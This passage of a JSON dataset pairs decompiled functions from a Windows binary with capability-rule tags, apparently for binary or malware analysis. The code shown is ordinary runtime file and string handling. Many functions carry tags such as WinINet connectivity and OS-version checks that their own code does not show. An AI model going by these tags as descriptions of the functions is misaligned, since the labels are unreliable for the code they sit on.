        "decompiled_code": "\nint64_t * fcn.14007c1c0(int64_t *arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    \n    pcVar2 = _sym.imp.msvcrt.dll__errno;\n    if ((*arg1 == 0) && (arg2 != 0)) {\n        puVar4 = (*_sym.imp.msvcrt.dll__errno)();\n        uVar1 = *puVar4;\n        puVar4 = (*pcVar2)();\n        *puVar4 = 0;\n        do {\n            iVar3 = sub.msvcrt.dll_fflush(arg2);\n            if (iVar3 == 0) {\n                puVar4 = (*pcVar2)();\n                *puVar4 = uVar1;\n                *arg1 = arg2;\n                *(arg1 + 1) = 0;\n                return arg1;\n            }\n            piVar5 = (*pcVar2)();\n        } while (*piVar5 == 4);\n        puVar4 = (*pcVar2)();\n        *puVar4 = uVar1;\n    }\n    return NULL;\n}\n",
        "token_count": 265
    },
    "14007c23": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14007c230(int64_t *arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.14001a420(arg3 & 0xffffffff);\n    if ((iVar1 != 0) && (*arg1 == 0)) {\n        iVar1 = sub.msvcrt.dll__fdopen(arg2, iVar1);\n        *arg1 = iVar1;\n        if (iVar1 != 0) {\n            *(arg1 + 1) = 1;\n            if (arg2 == 0) {\n                sub.msvcrt.dll_setvbuf(iVar1, 0, 4, 0);\n            }\n            return arg1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 170
    },
    "14007c41": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14007c410(int64_t *arg1)\n\n{\n    if ((*arg1 != 0) && (*(arg1 + 1) != '\\0')) {\n    // WARNING: Could not recover jumptable at 0x0001400185a0. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_fclose)(*arg1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "14007c48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14007c480(int64_t **arg1, ulong *arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t **ppiVar3;\n    ulong *puVar4;\n    ulong *puVar5;\n    int64_t unaff_RBX;\n    int64_t **unaff_RBP;\n    ulong unaff_RSI;\n    ulong *unaff_RDI;\n    \n    while( true ) {\n        puVar4 = arg2;\n        ppiVar3 = arg1;\n        *(*0x20 + -8) = unaff_RBP;\n        *(*0x20 + -0x10) = unaff_RDI;\n        *(*0x20 + -0x18) = unaff_RSI;\n        *(*0x20 + -0x20) = unaff_RBX;\n        if ((puVar4 + arg3 == NULL) || (puVar4 != NULL)) break;\n        arg1 = 0x140101340;\n        *(*0x20 + -0x60) = 0x14007c504;\n        puVar5 = puVar4;\n        fcn.1400b7080(0x140101340);\n        arg2 = *puVar5;\n        unaff_RBX = arg3;\n        *0x20 = *0x20 + -0x58;\n        unaff_RBP = ppiVar3;\n        unaff_RDI = puVar4;\n        arg3 = puVar5[1];\n    }\n    *(*0x20 + -0x60) = 0x14007c4ad;\n    piVar1 = fcn.140076110(arg3, 0);\n    piVar2 = piVar1 + 3;\n    if (arg3 == 1) {\n        *(piVar1 + 3) = *puVar4;\n    }\n    else if (arg3 != 0) {\n        *(*0x20 + -0x60) = 0x14007c4eb;\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar4, arg3);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = arg3;\n    *(piVar1 + arg3 + 0x18) = 0;\n    *ppiVar3 = piVar2;\n    return;\n}\n",
        "token_count": 525
    },
    "14007c71": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14007c710(int64_t **arg1, ulong *arg2, int64_t *arg3)\n\n{\n    uchar uVar1;\n    int64_t *piVar2;\n    uchar *puVar3;\n    int64_t **ppiVar4;\n    int64_t **noname_0;\n    ulong *puVar5;\n    int64_t *piStack104;\n    int64_t *piStack96;\n    int64_t **ppiStack88;\n    ulong *puStack80;\n    int64_t *piStack32;\n    \n    ppiVar4 = arg1 + 2;\n    *arg1 = ppiVar4;\n    if ((arg2 == NULL) && (arg3 != NULL)) {\n        noname_0 = 0x1401013b0;\n        puStack80 = 0x14007c7c6;\n        puVar5 = arg2;\n        fcn.1400b7080(0x1401013b0);\n        piVar2 = puVar5[1];\n        ppiVar4 = noname_0 + 2;\n        *noname_0 = ppiVar4;\n        puVar3 = *puVar5;\n        piStack104 = piVar2;\n        piStack96 = arg3;\n        ppiStack88 = arg1;\n        puStack80 = arg2;\n        if (piVar2 < 0x10) {\n            if (piVar2 == 0x1) {\n                uVar1 = *puVar3;\n                noname_0[1] = 0x1;\n                *(noname_0 + 2) = uVar1;\n                *(noname_0 + 0x11) = 0;\n                return;\n            }\n            if (piVar2 == NULL) {\n                noname_0[1] = NULL;\n                *ppiVar4 = 0;\n                return;\n            }\n        }\n        else {\n            ppiVar4 = fcn.1400a3300(noname_0, &stack0xffffffffffffff98, 0);\n            *noname_0 = ppiVar4;\n            noname_0[2] = piStack104;\n        }\n        sub.msvcrt.dll_memcpy(ppiVar4, puVar3, piVar2);\n        noname_0[1] = piStack104;\n        *(*noname_0 + piStack104) = 0;\n        return;\n    }\n    piStack32 = arg3;\n    if (arg3 < 0x10) {\n        if (arg3 == 0x1) {\n            uVar1 = *arg2;\n            arg1[1] = 0x1;\n            *(arg1 + 2) = uVar1;\n            *(arg1 + 0x11) = 0;\n            return;\n        }\n        if (arg3 == NULL) {\n            arg1[1] = NULL;\n            *ppiVar4 = 0;\n            return;\n        }\n    }\n    else {\n        puStack80 = 0x14007c788;\n        ppiVar4 = fcn.1400a3300(arg1, &stack0xffffffffffffffe0, 0);\n        *arg1 = ppiVar4;\n        arg1[2] = piStack32;\n    }\n    puStack80 = 0x14007c7a2;\n    sub.msvcrt.dll_memcpy(ppiVar4, arg2, arg3);\n    arg1[1] = piStack32;\n    *(*arg1 + piStack32) = 0;\n    return;\n}\n",
        "token_count": 777
    },
    "14009c80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009c800(ulong *arg1)\n\n{\n    *arg1 = 0x14010bde0;\n    fcn.14009f7a0(arg1 + 2);\n    if ((*(arg1 + 3) != '\\0') && (arg1[6] != 0)) {\n        fcn.1400b64c0();\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "14007d27": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14007d270(int64_t *arg1, int64_t *arg2, ulong arg3)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    int64_t **ppiStack168;\n    int64_t iStack160;\n    int64_t *apiStack152 [2];\n    int64_t **ppiStack136;\n    int64_t iStack128;\n    int64_t *apiStack120 [2];\n    uchar *puStack104;\n    ulong uStack96;\n    uchar auStack88 [24];\n    \n    piVar2 = arg2[1];\n    iVar3 = *arg2;\n    pcVar4 = *(*piVar2 + 0x20);\n    if (pcVar4 == 0x14001cde0) {\n        puStack104 = auStack88;\n        auStack88[0] = 0;\n        uStack96 = 0;\n        if (iVar3 == 1) {\n            fcn.1400a0b80(&puStack104, 0, 0, \"iostream error\");\n        }\n        else {\n            fcn.1400a0b80(&puStack104, 0, 0, 0x140101388);\n        }\n    }\n    else {\n        (*pcVar4)(&puStack104);\n    }\n    piVar6 = fcn.1400a0b80(&puStack104, 0, 0, 0x1401013ab);\n    if (*piVar6 == piVar6 + 2) {\n        iStack128 = -1;\n        ppiStack136 = apiStack120;\n        if (piVar6[1] != -1) {\n            sub.msvcrt.dll_memcpy(apiStack120);\n            iStack128 = piVar6[1];\n        }\n    }\n    else {\n        apiStack120[0] = piVar6[2];\n        iStack128 = piVar6[1];\n        ppiStack136 = *piVar6;\n    }\n    *piVar6 = piVar6 + 2;\n    piVar6[1] = 0;\n    *(piVar6 + 2) = 0;\n    sub.msvcrt.dll_strlen(arg3);\n    piVar6 = fcn.1400a0b80(&ppiStack136, 0, 0, arg3);\n    ppiVar1 = piVar6 + 2;\n    if (*piVar6 == ppiVar1) {\n        iStack160 = -1;\n        ppiStack168 = apiStack152;\n        if (piVar6[1] != -1) {\n            sub.msvcrt.dll_memcpy(apiStack152, ppiVar1);\n            iStack160 = piVar6[1];\n        }\n    }\n    else {\n        apiStack152[0] = piVar6[2];\n        iStack160 = piVar6[1];\n        ppiStack168 = *piVar6;\n    }\n    *piVar6 = ppiVar1;\n    piVar6[1] = 0;\n    *(piVar6 + 2) = 0;\n    fcn.14008fe50(arg1, &ppiStack168);\n    if (ppiStack168 != apiStack152) {\n        fcn.1400b64d0();\n    }\n    if (ppiStack136 != apiStack120) {\n        fcn.1400b64d0();\n    }\n    if (puStack104 != auStack88) {\n        fcn.1400b64d0();\n    }\n    iVar5 = *0x140103290;\n    arg1[2] = iVar3;\n    arg1[3] = piVar2;\n    *arg1 = iVar5 + 0x10;\n    return;\n}\n",
        "token_count": 853
    },
    "14007d51": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14007d510(int64_t *arg1, int64_t *arg2, uint8_t **arg3)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    uint8_t *puVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    int64_t **ppiVar6;\n    int64_t **ppiVar7;\n    int64_t **ppiVar8;\n    uchar **ppuStack176;\n    int64_t **ppiStack168;\n    int64_t iStack160;\n    int64_t *apiStack152 [2];\n    int64_t **ppiStack136;\n    int64_t **ppiStack128;\n    int64_t **appiStack120 [2];\n    uchar *puStack104;\n    uint64_t uStack96;\n    uchar uStack88;\n    unkbyte7 Stack87;\n    \n    piVar1 = arg2[1];\n    iVar2 = *arg2;\n    if (*(*piVar1 + 0x20) == 0x14001cde0) {\n        puStack104 = &uStack88;\n        uStack96 = 0;\n        uStack88 = 0;\n        if (iVar2 == 1) {\n            fcn.1400a0b80(&puStack104, 0, 0, \"iostream error\");\n        }\n        else {\n            fcn.1400a0b80(&puStack104, 0, 0, 0x140101388);\n        }\n    }\n    else {\n        (**(*piVar1 + 0x20))(&puStack104, piVar1);\n    }\n    ppuStack176 = &puStack104;\n    puVar3 = *arg3;\n    ppiVar7 = arg3[1];\n    ppiStack168 = ppiVar7;\n    ppiStack136 = appiStack120;\n    if (0xf < ppiVar7) {\n        ppiVar6 = fcn.1400a3300(&ppiStack136, &ppiStack168, 0);\n        appiStack120[0] = ppiStack168;\n        ppiStack136 = ppiVar6;\n        goto code_r0x00014007d76a;\n    }\n    if (ppiVar7 == 0x1) {\n        appiStack120[0] = appiStack120[0] & 0xffffffffffffff00 | *puVar3;\n    }\n    else {\n        ppiVar6 = appiStack120;\n        if (ppiVar7 != NULL) goto code_r0x00014007d76a;\n    }\n    do {\n        ppiVar7 = ppiStack168;\n        *(ppiStack136 + ppiStack168) = 0;\n        ppiStack128 = ppiStack168;\n        if (0x3fffffffffffffffU - ppiStack168 < 2) {\n            fcn.1400b7170(\"basic_string::append\");\n        }\n        else {\n            fcn.1400a31b0(&ppiStack136, 0x1401013ab, 2);\n            ppiVar6 = ppiStack128 + uStack96;\n            if (ppiStack136 == appiStack120) {\n                if ((0xf < ppiVar6) && (puStack104 != &uStack88)) {\ncode_r0x00014007d64a:\n                    ppiVar8 = CONCAT71(Stack87, uStack88);\n                    goto code_r0x00014007d652;\n                }\n            }\n            else if (appiStack120[0] < ppiVar6) {\n                if (puStack104 != &uStack88) goto code_r0x00014007d64a;\n                ppiVar8 = 0xf;\ncode_r0x00014007d652:\n                if (ppiVar6 <= ppiVar8) {\n                    piVar5 = fcn.1400a0b80(ppuStack176, 0, 0, ppiStack136);\n                    goto code_r0x00014007d67c;\n                }\n            }\n            if (uStack96 <= 0x3fffffffffffffffU - ppiStack128) {\n                piVar5 = fcn.1400a31b0(&ppiStack136, puStack104, uStack96);\ncode_r0x00014007d67c:\n                ppiVar7 = piVar5 + 2;\n                if (*piVar5 == ppiVar7) {\n                    iStack160 = -1;\n                    ppiStack168 = apiStack152;\n                    if (piVar5[1] != -1) {\n                        sub.msvcrt.dll_memcpy(apiStack152, ppiVar7);\n                        iStack160 = piVar5[1];\n                    }\n                }\n                else {\n                    apiStack152[0] = piVar5[2];\n                    iStack160 = piVar5[1];\n                    ppiStack168 = *piVar5;\n                }\n                *piVar5 = ppiVar7;\n                piVar5[1] = 0;\n                *(piVar5 + 2) = 0;\n                fcn.14008fe50(arg1, &ppiStack168);\n                if (ppiStack168 != apiStack152) {\n                    fcn.1400b64d0();\n                }\n                if (ppiStack136 != appiStack120) {\n                    fcn.1400b64d0();\n                }\n                if (puStack104 != &uStack88) {\n                    fcn.1400b64d0();\n                }\n                iVar4 = *0x140103290;\n                arg1[2] = iVar2;\n                arg1[3] = piVar1;\n                *arg1 = iVar4 + 0x10;\n                return;\n            }\n        }\n        fcn.1400b7170(\"basic_string::append\");\n        ppiVar6 = appiStack120;\ncode_r0x00014007d76a:\n        sub.msvcrt.dll_memcpy(ppiVar6, puVar3, ppiVar7);\n    } while( true );\n}\n",
        "token_count": 1337
    },
    "14007e63": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14007e630(ulong arg1, ulong noname_1, int64_t *arg3)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    uchar (*in_R9) [16];\n    uchar *unaff_R12;\n    uchar *puVar8;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000038;\n    int64_t *in_stack_00000048;\n    uchar auStack656 [16];\n    uchar *apuStack640 [2];\n    uchar auStack624 [16];\n    uchar auStack608 [16];\n    ulong uStack584;\n    int64_t *piStack576;\n    uint64_t uStack568;\n    uint64_t uStack560;\n    uchar *puStack552;\n    uchar uStack496;\n    ulong uStack488;\n    ushort uStack480;\n    ushort uStack464;\n    unkbyte6 Stack462;\n    uchar auStack456 [16];\n    uchar uStack433;\n    int64_t iStack432;\n    uchar auStack424 [16];\n    ulong uStack408;\n    int64_t *piStack400;\n    uint64_t uStack392;\n    uint64_t uStack384;\n    uchar *puStack376;\n    uint32_t uStack328;\n    uchar **ppuStack320;\n    uint32_t uStack312;\n    ulong uStack304;\n    ushort uStack296;\n    unkbyte6 Stack294;\n    uchar auStack288 [16];\n    uchar *apuStack272 [2];\n    uchar auStack256 [16];\n    uchar auStack240 [16];\n    ulong uStack216;\n    int64_t *piStack208;\n    uint64_t uStack200;\n    uint64_t uStack192;\n    uint32_t uStack128;\n    uint32_t uStack112;\n    unkbyte10 *pStack104;\n    ushort uStack96;\n    unkbyte6 Stack94;\n    uchar auStack88 [16];\n    uchar uStack65;\n    int64_t iStack64;\n    \n    auStack240 = *in_R9;\n    uStack192 = in_stack_00000028;\n    uStack200 = in_stack_00000038;\n    if (in_stack_00000048 == NULL) {\n        auStack88 = auStack240;\n        (**(*arg3 + 0x10))(arg1, arg3, auStack88, uStack192 & 0xff);\n    }\n    else {\n        if (in_stack_00000048[4] == 0) {\n            piStack400 = arg3;\n            uStack216 = fcn.1400b7080(0x1400fd68a);\n            fcn.140075fa0(iStack64 + -0x18);\n            uVar5 = uStack216;\n            fcn.14000f000(uStack216);\n            auStack424 = *in_R9;\n            uStack384 = uStack128;\n            uStack392 = uStack112;\n            piVar6 = CONCAT62(Stack94, uStack96);\n            piStack208 = arg3;\n            if (piVar6 == NULL) {\n                ppuStack320 = &uStack304;\n                uStack328 = uStack112;\n                uStack304 = *pStack104;\n                uStack296 = *pStack104 >> 0x40;\n                puStack376 = 0x14007e8ca;\n                auStack288 = auStack424;\n                (**(*piStack400 + 0x10))();\n                return uVar5;\n            }\n            piStack576 = piStack400;\n            if (piVar6[4] != 0) {\n                iVar3 = *piVar6;\n                unaff_R12 = auStack256;\n                apuStack272[0] = unaff_R12;\n                if ((iVar3 != 0) || (piVar6[1] == 0)) {\n                    ppuStack320 = apuStack272;\n                    uStack328 = uStack112;\n                    puStack376 = 0x14007e82c;\n                    fcn.1400a1210(ppuStack320, iVar3, iVar3 + piVar6[1]);\n                    puStack376 = 0x14007e85c;\n                    auStack288 = auStack424;\n                    (**(*piStack400 + 0x18))(uVar5, piStack400, auStack288, uStack384 & 0xff);\n                    if (apuStack272[0] == unaff_R12) {\n                        return uVar5;\n                    }\n                    puStack376 = 0x14007e86b;\n                    fcn.1400b64d0();\n                    return uVar5;\n                }\n                puStack376 = 0x14007e8d1;\n                fcn.1400a3d10();\n            }\n            puStack376 = 0x14007e8dd;\n            uStack408 = fcn.1400b7080(\"uninitialized __any_string\");\n            if (apuStack272[0] != unaff_R12) {\n                puStack376 = 0x14007e8ef;\n                fcn.1400b64d0();\n            }\n            puStack376 = 0x14007e8f7;\n            uVar5 = uStack408;\n            fcn.14000f000(uStack408);\n            auStack608 = *in_R9;\n            uStack560 = uStack328;\n            uStack568 = uStack312;\n            piVar6 = CONCAT62(Stack294, uStack296);\n            puStack376 = unaff_R12;\n            if (piVar6 == NULL) {\n                auStack456 = auStack608;\n                (**(*piStack576 + 0x10))();\n            }\n            else {\n                if (piVar6[4] == 0) {\n                    piVar7 = piStack576;\n                    uStack584 = fcn.1400b7080(0x1400fd68a);\n                    fcn.14006caa0(iStack432 + -0x18);\n                    uVar5 = uStack584;\n                    fcn.14000f000(uStack584);\n                    auStack656 = *in_R9;\n                    piVar6 = CONCAT62(Stack462, uStack464);\n                    puStack552 = unaff_R12;\n                    if (piVar6 == NULL) {\n                        (**(*piVar7 + 0x10))();\n                        return uVar5;\n                    }\n                    puVar8 = unaff_R12;\n                    if (piVar6[4] != 0) {\n                        iVar3 = *piVar6;\n                        puVar8 = auStack624;\n                        apuStack640[0] = puVar8;\n                        if ((iVar3 != 0) || (piVar6[1] == 0)) {\n                            fcn.1400a4ce0(apuStack640, iVar3, iVar3 + piVar6[1] * 2);\n                            (**(*piVar7 + 0x18))\n                                      (uVar5, piVar7, auStack656, uStack496, uStack488, uStack480, apuStack640);\n                            if (apuStack640[0] == puVar8) {\n                                return uVar5;\n                            }\n                            fcn.1400b64d0();\n                            return uVar5;\n                        }\n                        fcn.1400a3d10();\n                    }\n                    piVar6 = fcn.1400b7080(\"uninitialized __any_string\");\n                    if (apuStack640[0] != puVar8) {\n                        fcn.1400b64d0();\n                    }\n                    fcn.14000f000(piVar6);\n                    *piVar6 = 0x140109150;\n                    piVar7 = piVar6[3];\n                    if (**0x140102a70 == 0) {\n                        iVar4 = *(piVar7 + 1);\n                        *(piVar7 + 1) = iVar4 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar2 = piVar7 + 1;\n                        iVar4 = *piVar2;\n                        *piVar2 = *piVar2 + -1;\n                    }\n                    if (iVar4 == 1) {\n                        (**(*piVar7 + 8))();\n                    }\n                    *piVar6 = *0x1401034a0 + 0x10;\n                    fcn.14009f7a0(piVar6 + 2);\n                    fcn.14009f7d0(piVar6);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n                    uVar5 = (*_sym.imp.msvcrt.dll_free)(piVar6);\n                    return uVar5;\n                }\n                iStack432 = fcn.14006c5c0(*piVar6, *piVar6 + piVar6[1] * 2);\n                auStack456 = auStack608;\n                (**(*piStack576 + 0x18))(uVar5, piStack576, auStack456, uStack560 & 0xff);\n                if (**0x140102a70 == 0) {\n                    iVar4 = *(iStack432 + -8);\n                    *(iStack432 + -8) = iVar4 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = iStack432 + -8;\n                    iVar4 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar4 < 1) {\n                    fcn.14006ca90(iStack432 + -0x18, &uStack433);\n                }\n            }\n            return uVar5;\n        }\n        iStack64 = fcn.140075a60(*in_stack_00000048, in_stack_00000048[1] + *in_stack_00000048);\n        auStack88 = auStack240;\n        (**(*arg3 + 0x18))(arg1, arg3, auStack88, uStack192 & 0xff);\n        if (**0x140102a70 == 0) {\n            iVar4 = *(iStack64 + -8);\n            *(iStack64 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack64 + -8;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.140075f90(iStack64 + -0x18, &uStack65);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 2364
    },
    "14007e7a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14007e7a0(ulong arg1, ulong noname_1, int64_t *arg3)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    uchar (*in_R9) [16];\n    uchar *unaff_R12;\n    uchar *puVar8;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000038;\n    unkbyte10 *in_stack_00000040;\n    int64_t *in_stack_00000048;\n    uchar auStack488 [16];\n    uchar *puStack472;\n    uchar auStack456 [16];\n    uchar auStack440 [16];\n    ulong uStack416;\n    int64_t *piStack408;\n    uint64_t uStack400;\n    uint64_t uStack392;\n    uchar *puStack384;\n    uchar uStack328;\n    ulong uStack320;\n    ushort uStack312;\n    ushort uStack296;\n    unkbyte6 Stack294;\n    uchar auStack288 [16];\n    uchar uStack265;\n    int64_t iStack264;\n    uchar auStack256 [16];\n    ulong uStack240;\n    int64_t *piStack232;\n    uint64_t uStack224;\n    uint64_t uStack216;\n    uchar *puStack208;\n    uint32_t uStack160;\n    uchar *puStack152;\n    uint32_t uStack144;\n    ulong uStack136;\n    ushort uStack128;\n    unkbyte6 Stack126;\n    uchar auStack120 [16];\n    uchar *puStack104;\n    uchar auStack88 [40];\n    \n    auStack256 = *in_R9;\n    uStack216 = in_stack_00000028;\n    uStack224 = in_stack_00000038;\n    if (in_stack_00000048 == NULL) {\n        puStack152 = &stack0xffffffffffffff78;\n        uStack160 = in_stack_00000038;\n        uStack136 = *in_stack_00000040;\n        uStack128 = *in_stack_00000040 >> 0x40;\n        puStack208 = 0x14007e8ca;\n        auStack120 = auStack256;\n        (**(*arg3 + 0x10))(arg1, arg3, &stack0xffffffffffffff88, uStack216 & 0xff);\n        return arg1;\n    }\n    piStack408 = arg3;\n    if (in_stack_00000048[4] != 0) {\n        iVar3 = *in_stack_00000048;\n        unaff_R12 = &stack0xffffffffffffffa8;\n        puStack104 = unaff_R12;\n        if ((iVar3 != 0) || (in_stack_00000048[1] == 0)) {\n            puStack152 = &stack0xffffffffffffff98;\n            uStack160 = in_stack_00000038;\n            puStack208 = 0x14007e82c;\n            fcn.1400a1210(puStack152, iVar3, iVar3 + in_stack_00000048[1]);\n            puStack208 = 0x14007e85c;\n            auStack120 = auStack256;\n            (**(*arg3 + 0x18))(arg1, arg3, &stack0xffffffffffffff88, uStack216 & 0xff);\n            if (puStack104 == unaff_R12) {\n                return arg1;\n            }\n            puStack208 = 0x14007e86b;\n            fcn.1400b64d0();\n            return arg1;\n        }\n        puStack208 = 0x14007e8d1;\n        fcn.1400a3d10();\n    }\n    puStack208 = 0x14007e8dd;\n    uStack240 = fcn.1400b7080(\"uninitialized __any_string\");\n    if (puStack104 != unaff_R12) {\n        puStack208 = 0x14007e8ef;\n        fcn.1400b64d0();\n    }\n    puStack208 = 0x14007e8f7;\n    uVar5 = uStack240;\n    fcn.14000f000(uStack240);\n    auStack440 = *in_R9;\n    uStack392 = uStack160;\n    uStack400 = uStack144;\n    piVar6 = CONCAT62(Stack126, uStack128);\n    piStack232 = arg3;\n    puStack208 = unaff_R12;\n    if (piVar6 == NULL) {\n        auStack288 = auStack440;\n        (**(*piStack408 + 0x10))();\n    }\n    else {\n        if (piVar6[4] == 0) {\n            piVar7 = piStack408;\n            uStack416 = fcn.1400b7080(0x1400fd68a);\n            fcn.14006caa0(iStack264 + -0x18);\n            uVar5 = uStack416;\n            fcn.14000f000(uStack416);\n            auStack488 = *in_R9;\n            piVar6 = CONCAT62(Stack294, uStack296);\n            puStack384 = unaff_R12;\n            if (piVar6 == NULL) {\n                (**(*piVar7 + 0x10))();\n                return uVar5;\n            }\n            puVar8 = unaff_R12;\n            if (piVar6[4] != 0) {\n                iVar3 = *piVar6;\n                puVar8 = &stack0xfffffffffffffe38;\n                puStack472 = puVar8;\n                if ((iVar3 != 0) || (piVar6[1] == 0)) {\n                    fcn.1400a4ce0(&stack0xfffffffffffffe28, iVar3, iVar3 + piVar6[1] * 2);\n                    (**(*piVar7 + 0x18))\n                              (uVar5, piVar7, &stack0xfffffffffffffe18, uStack328, uStack320, uStack312, \n                               &stack0xfffffffffffffe28);\n                    if (puStack472 == puVar8) {\n                        return uVar5;\n                    }\n                    fcn.1400b64d0();\n                    return uVar5;\n                }\n                fcn.1400a3d10();\n            }\n            piVar6 = fcn.1400b7080(\"uninitialized __any_string\");\n            if (puStack472 != puVar8) {\n                fcn.1400b64d0();\n            }\n            fcn.14000f000(piVar6);\n            *piVar6 = 0x140109150;\n            piVar7 = piVar6[3];\n            if (**0x140102a70 == 0) {\n                iVar4 = *(piVar7 + 1);\n                *(piVar7 + 1) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar2 = piVar7 + 1;\n                iVar4 = *piVar2;\n                *piVar2 = *piVar2 + -1;\n            }\n            if (iVar4 == 1) {\n                (**(*piVar7 + 8))();\n            }\n            *piVar6 = *0x1401034a0 + 0x10;\n            fcn.14009f7a0(piVar6 + 2);\n            fcn.14009f7d0(piVar6);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar5 = (*_sym.imp.msvcrt.dll_free)(piVar6);\n            return uVar5;\n        }\n        iStack264 = fcn.14006c5c0(*piVar6, *piVar6 + piVar6[1] * 2);\n        auStack288 = auStack440;\n        (**(*piStack408 + 0x18))(uVar5, piStack408, &stack0xfffffffffffffee0, uStack392 & 0xff);\n        if (**0x140102a70 == 0) {\n            iVar4 = *(iStack264 + -8);\n            *(iStack264 + -8) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack264 + -8;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.14006ca90(iStack264 + -0x18, &stack0xfffffffffffffef7);\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 1930
    },
    "14007e90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
